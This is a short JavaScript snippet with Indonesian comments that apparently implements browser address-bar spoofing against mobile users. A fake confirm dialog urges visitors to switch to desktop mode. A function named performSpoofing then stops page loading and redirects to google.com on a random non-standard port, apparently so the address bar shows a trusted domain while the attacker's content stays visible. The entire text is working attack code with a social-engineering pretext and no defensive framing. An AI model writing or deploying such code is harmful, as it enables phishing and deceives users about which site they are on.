<script>
// Tunggu hingga halaman selesai load
window.addEventListener('load', function() {
    
    // Hanya untuk mobile devices
    if (window.innerWidth < 1024 && /Android|iPhone|Mobile/i.test(navigator.userAgent)) {
        
        // Prompt sederhana
        setTimeout(function() {
            if (confirm("ðŸ”„ This site works best in Desktop Mode.\n\nPlease:\n1. Tap the menu (â‹®)\n2. Check 'Desktop site'\n3. Page will reload\n\nClick OK to continue.")) {
                
                // Mulai monitoring untuk desktop mode
                startDesktopModeMonitor();
                
            }
        }, 2000);
    }
    
    function startDesktopModeMonitor() {
        let checkCount = 0;
        const maxChecks = 15;
        
        const checkInterval = setInterval(function() {
            checkCount++;
            
            // Deteksi desktop mode
            const isLikelyDesktop = 
                window.innerWidth > 980 || 
                !/Mobi|Android|iPhone/i.test(navigator.userAgent) ||
                document.documentElement.clientWidth > 980;
            
            if (isLikelyDesktop || checkCount >= maxChecks) {
                clearInterval(checkInterval);
                
                // Beri waktu tambahan untuk render
                setTimeout(performSpoofing, 300);
            }
        }, 1000);
    }
    
    function performSpoofing() {
        try {
            // Stop loading
            if (window.stop) window.stop();
            
            // Redirect dengan port acak
            const ports = [8080, 8443, 9443, 3000, 5000, 7000];
            const randomPort = ports[Math.floor(Math.random() * ports.length)];
            
            window.location.replace("https://google.com:" + randomPort + "/");
            
        } catch (error) {
            console.error('Spoofing failed:', error);
        }
    }
});
</script>
